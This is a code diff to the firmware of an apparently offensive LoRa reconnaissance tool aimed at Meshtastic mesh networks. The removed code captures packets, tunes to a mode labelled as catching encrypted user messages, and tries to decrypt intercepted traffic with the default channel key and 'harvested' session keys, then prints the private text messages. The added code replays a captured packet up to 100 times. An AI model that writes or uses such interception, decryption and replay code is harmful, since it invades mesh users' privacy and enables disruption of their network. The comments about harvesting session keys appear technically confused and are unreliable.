@@ -126,34 +126,9 @@ bool LoRaReconTool::initialize() {
     radio.startReceive();
     Serial.println("[RECON] Started\n");
     
-    // Initialize optional modules
-    initializeStressTesting();
-    
-    // Initialize PSK decryption system FIRST
+    // Initialize PSK decryption system
     #ifdef ENABLE_PSK_TESTING
     PSKDecryption::initialize();
-    #endif
-    
-    // Initialize session key manager with channel PSK
-    #ifdef ENABLE_PSK_TESTING
-    uint8_t channelPSK[16];
-    size_t pskLen = 0;
-    // Decode channel PSK - replace with your actual PSK!
-    const char* myChannelPSK = "AQ==";  // Default LongFast PSK
-    
-    int result = mbedtls_base64_decode(channelPSK, sizeof(channelPSK), &pskLen,
-                                       (const unsigned char*)myChannelPSK, 
-                                       strlen(myChannelPSK));
-    
-    if (result == 0 && pskLen > 0) {
-        sessionKeyManager.initialize(&radio, channelPSK, pskLen);
-        Serial.println("\n📊 SESSION KEY HARVESTING ENABLED");
-        Serial.println("   Press 'q' in menu to request session keys");
-        Serial.println("   Press 'Q' to show session key status");
-        Serial.println("   Or wait for passive key announcements\n");
-    } else {
-        Serial.println("[WARNING] Failed to decode channel PSK for session key manager");
-    }
     #endif
     
     // Initialize command handler
@@ -392,19 +367,6 @@ void LoRaReconTool::processQueuedPackets() {
         // Analyze packet using ProtocolAnalyzer (skip verbose diagnostics for speed)
         PacketInfo info = protocolAnalyzer.analyze(data, length, rssi);
         
-        #ifdef ENABLE_PSK_TESTING
-        // Check if this is a session key announcement
-        if (sessionKeyManager.processKeyAnnouncement(packetBuffer, packetLength)) {
-            Serial.println("[HARVEST] 🎉 Session key harvested from announcement!");
-            sessionKeyManager.printStatus();
-        }
-        
-        // Try session key decryption for large packets
-        if (packetLength >= 40 && strcmp(info.protocol, "Meshtastic") == 0) {
-            trySessionKeyDecryption(packetBuffer, packetLength, info.nodeId, qp.timestamp);
-        }
-        #endif
-    
         // Enhanced packet analysis for Meshtastic (minimal output for speed)
         if (strcmp(info.protocol, "Meshtastic") == 0) {
             // Try to extract GPS position silently
@@ -659,30 +621,6 @@ void LoRaReconTool::handleUserInput(char cmd) {
         return;
     }
     
-    // Quick SF8 targeting (for encrypted user messages)
-    if (cmd == '8') {
-        Serial.println("\n🎯 TARGETING SF8 FREQUENCY FOR ENCRYPTED MESSAGES");
-        Serial.println("Switching to Meshtastic_902_SF8 (902.125 MHz, SF8, BW250)");
-        
-        reconState.scanState.mode = MODE_TARGETED_CAPTURE;
-        reconState.scanState.targetConfig = 6;  // Meshtastic_902_SF8
-        reconState.scanState.currentConfig = 6;
-        
-        Serial.println("Configuration:");
-        const ScanConfig& cfg = reconState.getScanConfig(6);
-        Serial.printf("  Frequency: %.3f MHz\n", cfg.frequency);
-        Serial.printf("  Spreading Factor: SF%d\n", cfg.spreadingFactor);
-        Serial.printf("  Bandwidth: %.0f kHz\n", cfg.bandwidth);
-        Serial.printf("  Sync Word: 0x%02X\n", cfg.syncWord);
-        Serial.println("\nThis configuration should capture encrypted user messages!");
-        Serial.println("Press 'm' for menu, 'r' to restart recon");
-        Serial.println("Monitoring for encrypted packets...\n");
-        
-        applyConfig(6);
-        radio.startReceive();
-        return;
-    }
-    
     if (cmd == 'd' || cmd == 'D') {
         showDeviceTypeSummary();
         Serial.print("\nPress any key to continue: ");
@@ -885,6 +823,75 @@ void LoRaReconTool::replayPacket(uint8_t slotIndex) {
     if (pkt.length > 32) Serial.print("...");
     Serial.println("\n");
     
+    // Ask for repeat count
+    Serial.print("Repeat count (1-100, or 0 to cancel): ");
+    uint32_t startTime = millis();
+    String input = "";
+    while (!Serial.available()) {
+        if (millis() - startTime > 30000) {  // 30 second timeout
+            Serial.println("\n[TIMEOUT] Cancelled.");
+            delay(1000);
+            showReplayMenu();
+            return;
+        }
+        esp_task_wdt_reset();
+        delay(10);
+    }
+    
+    // Read the number
+    while (Serial.available()) {
+        char c = Serial.read();
+        if (c == '\n' || c == '\r') break;
+        if (c >= '0' && c <= '9') {
+            input += c;
+        }
+        delay(10);
+    }
+    
+    int repeatCount = input.toInt();
+    Serial.println(repeatCount);
+    
+    if (repeatCount <= 0 || repeatCount > 100) {
+        Serial.println("❌ Cancelled or invalid count");
+        delay(1000);
+        showReplayMenu();
+        return;
+    }
+    
+    // Optional delay between transmissions
+    uint16_t delayMs = 1000;  // Default 1 second between packets
+    if (repeatCount > 1) {
+        Serial.print("Delay between packets in ms (100-10000, default 1000): ");
+        startTime = millis();
+        input = "";
+        while (!Serial.available()) {
+            if (millis() - startTime > 10000) {  // 10 second timeout
+                Serial.printf("\n[TIMEOUT] Using default %d ms\n", delayMs);
+                break;
+            }
+            esp_task_wdt_reset();
+            delay(10);
+        }
+        
+        if (Serial.available()) {
+            while (Serial.available()) {
+                char c = Serial.read();
+                if (c == '\n' || c == '\r') break;
+                if (c >= '0' && c <= '9') {
+                    input += c;
+                }
+                delay(10);
+            }
+            int userDelay = input.toInt();
+            if (userDelay >= 100 && userDelay <= 10000) {
+                delayMs = userDelay;
+                Serial.println(delayMs);
+            } else {
+                Serial.printf("\n[Invalid] Using default %d ms\n", delayMs);
+            }
+        }
+    }
+    
     // Apply the correct radio configuration
     if (!applyConfig(pkt.configIndex)) {
         Serial.println("❌ Failed to apply radio configuration");
@@ -893,25 +900,53 @@ void LoRaReconTool::replayPacket(uint8_t slotIndex) {
         return;
     }
     
-    // Transmit the packet
-    Serial.print("📡 Transmitting... ");
-    radio.setOutputPower(10);  // Set transmission power
-    
     // Create mutable copy for transmission (RadioLib requires non-const)
     uint8_t txBuffer[256];
     memcpy(txBuffer, pkt.data, pkt.length);
     
-    // Feed watchdog before transmission (can take several seconds with high SF)
-    esp_task_wdt_reset();
-    int state = radio.transmit(txBuffer, pkt.length);
-    esp_task_wdt_reset();  // Feed again after transmission completes
+    // Transmit the packet multiple times
+    Serial.printf("\n📡 Transmitting %d time(s) with %d ms delay...\n", repeatCount, delayMs);
+    radio.setOutputPower(10);  // Set transmission power
+    
+    int successCount = 0;
+    int failCount = 0;
+    
+    for (int i = 0; i < repeatCount; i++) {
+        Serial.printf("[%d/%d] ", i + 1, repeatCount);
+        
+        // Feed watchdog before transmission (can take several seconds with high SF)
+        esp_task_wdt_reset();
+        int state = radio.transmit(txBuffer, pkt.length);
+        esp_task_wdt_reset();  // Feed again after transmission completes
+        
+        if (state == RADIOLIB_ERR_NONE) {
+            Serial.println("✅");
+            successCount++;
+        } else {
+            Serial.printf("❌ (error %d)\n", state);
+            failCount++;
+        }
+        
+        // Delay between transmissions (except after last one)
+        if (i < repeatCount - 1) {
+            delay(delayMs);
+        }
+    }
+    
     radio.setOutputPower(0);   // Back to receive-only mode
     
-    if (state == RADIOLIB_ERR_NONE) {
-        Serial.println("✅ SUCCESS");
-        Serial.println("Packet replayed successfully!");
+    Serial.println("\n📊 REPLAY SUMMARY");
+    Serial.println("=================");
+    Serial.printf("Total attempts: %d\n", repeatCount);
+    Serial.printf("Successful: %d (%.1f%%)\n", successCount, (float)successCount / repeatCount * 100.0);
+    Serial.printf("Failed: %d (%.1f%%)\n", failCount, (float)failCount / repeatCount * 100.0);
+    
+    if (successCount == repeatCount) {
+        Serial.println("✅ All packets transmitted successfully!");
+    } else if (successCount > 0) {
+        Serial.println("⚠️ Some packets failed to transmit");
     } else {
-        Serial.printf("❌ FAILED (error %d)\n", state);
+        Serial.println("❌ All transmissions failed");
     }
     
     Serial.println("\nPress any key to return to replay menu...");
@@ -996,150 +1031,6 @@ void LoRaReconTool::handleButtonPress(uint32_t now) {
                                                     reconState.scanState.currentConfig, 
                                                     reconState.getNumConfigs());
                 }
-            }
-        }
-    }
-}
-
-// Try decrypting with session key
-void LoRaReconTool::trySessionKeyDecryption(const uint8_t* data, size_t length,
-                                            uint32_t nodeId, uint32_t packetId) {
-    // Extract encrypted payload
-    if (length < 20) return;
-    
-    bool hasHeader = (data[0] == 0xFF && data[1] == 0xFF && 
-                      data[2] == 0xFF && data[3] == 0xFF);
-    
-    if (!hasHeader) return;
-    
-    // Meshtastic header is 16 bytes (was using 14, now corrected)
-    const uint8_t* encryptedData = data + 16;
-    size_t encryptedLen = length - 16;
-    
-    // Construct nonce with CORRECT little-endian format
-    uint8_t nonce[16];
-    memset(nonce, 0, sizeof(nonce));
-    // PacketID (little-endian)
-    nonce[0] = (packetId) & 0xFF;
-    nonce[1] = (packetId >> 8) & 0xFF;
-    nonce[2] = (packetId >> 16) & 0xFF;
-    nonce[3] = (packetId >> 24) & 0xFF;
-    // NodeID - use raw packet bytes directly (no endian conversion)
-    nonce[8] = data[4];
-    nonce[9] = data[5];
-    nonce[10] = data[6];
-    nonce[11] = data[7];
-    
-    uint8_t decrypted[256];
-    if (encryptedLen > sizeof(decrypted)) return;
-    
-    // Try cached session keys for this channel
-    const SessionKey* sessionKey = sessionKeyManager.getSessionKey(0);
-    if (sessionKey) {
-        if (tryDecryptWithKey(encryptedData, encryptedLen, nonce, sessionKey->keyBytes, 256, decrypted)) {
-            Serial.println("[SESSION] 🎯 Decrypted with CACHED session key!");
-            extractAndPrintTextMessage(decrypted, encryptedLen, "SESSION KEY");
-            return;
-        }
-    }
-    
-    // No valid session key available
-    // Note: Meshtastic uses PKAM (Public Key Authenticated Messaging) with Curve25519
-    // Session keys are 256-bit and cryptographically negotiated per sender-receiver pair
-    // There are no "default" session keys - they must be harvested from the network
-    
-    Serial.println("[SESSION] ⚠️  Encrypted text message detected (no valid session key)");
-    Serial.printf("[SESSION]    Node: 0x%08X, Packet: 0x%08X, Size: %d bytes\n", 
-                  nodeId, packetId, length);
-    Serial.println("[SESSION]    💡 TIP: Press 'q' to request session keys from mesh");
-}
-
-// Helper: Try to decrypt with a specific key
-bool LoRaReconTool::tryDecryptWithKey(const uint8_t* encryptedData, size_t encryptedLen,
-                                      const uint8_t* nonce, const uint8_t* key, 
-                                      uint16_t keyBits, uint8_t* decrypted) {
-    mbedtls_aes_context aes;
-    mbedtls_aes_init(&aes);
-    
-    if (mbedtls_aes_setkey_enc(&aes, key, keyBits) != 0) {
-        mbedtls_aes_free(&aes);
-        return false;
-    }
-    
-    uint8_t nonce_counter[16];
-    uint8_t stream_block[16];
-    memcpy(nonce_counter, nonce, 16);
-    memset(stream_block, 0, 16);
-    size_t nc_off = 0;
-    
-    int result = mbedtls_aes_crypt_ctr(&aes, encryptedLen, &nc_off,
-                                       nonce_counter, stream_block,
-                                       encryptedData, decrypted);
-    mbedtls_aes_free(&aes);
-    
-    if (result != 0) return false;
-    
-    // Validate: Check if this looks like a TEXT_MESSAGE_APP protobuf
-    if (decrypted[0] == 0x08 && decrypted[1] == 0x01) {
-        return true;
-    }
-    
-    return false;
-}
-
-// Helper: Extract and print text message from decrypted protobuf
-void LoRaReconTool::extractAndPrintTextMessage(const uint8_t* decrypted, size_t encryptedLen, const char* keyType) {
-    // Check if this is a TEXT_MESSAGE_APP packet
-    if (decrypted[0] != 0x08 || decrypted[1] != 0x01) {
-        return;
-    }
-    
-    Serial.printf("\n[SESSION] 🎯 Successfully decrypted with %s!\n", keyType);
-    Serial.println("[SESSION] This is a TEXT_MESSAGE_APP packet!");
-    
-    // Extract the text message from protobuf
-    if (decrypted[2] == 0x12) {
-        size_t pos = 3;
-        uint32_t payloadLen = 0;
-        uint8_t shift = 0;
-        
-        // Decode payload length (varint)
-        while (pos < encryptedLen) {
-            uint8_t byte = decrypted[pos++];
-            payloadLen |= ((uint32_t)(byte & 0x7F)) << shift;
-            if ((byte & 0x80) == 0) break;
-            shift += 7;
-        }
-        
-        // Look for text field (0x0A)
-        if (pos < encryptedLen && decrypted[pos] == 0x0A) {
-            pos++;
-            uint32_t textLen = 0;
-            shift = 0;
-            
-            // Decode text length (varint)
-            while (pos < encryptedLen) {
-                uint8_t byte = decrypted[pos++];
-                textLen |= ((uint32_t)(byte & 0x7F)) << shift;
-                if ((byte & 0x80) == 0) break;
-                shift += 7;
-            }
-            
-            if (pos + textLen <= encryptedLen && textLen > 0 && textLen < 200) {
-                Serial.println("\n╔════════════════════════════════════════════╗");
-                Serial.printf("║  📧 TEXT MESSAGE (%s): \"", keyType);
-                
-                for (uint32_t i = 0; i < textLen; i++) {
-                    char c = decrypted[pos + i];
-                    if (c >= 32 && c <= 126) {
-                        Serial.print(c);
-                    } else if (c == '\n' || c == '\r') {
-                        Serial.print(" ");  // Replace newlines with space
-                    }
-                }
-                
-                Serial.println("\"");
-                Serial.println("╚════════════════════════════════════════════╝\n");
             }
         }
     }
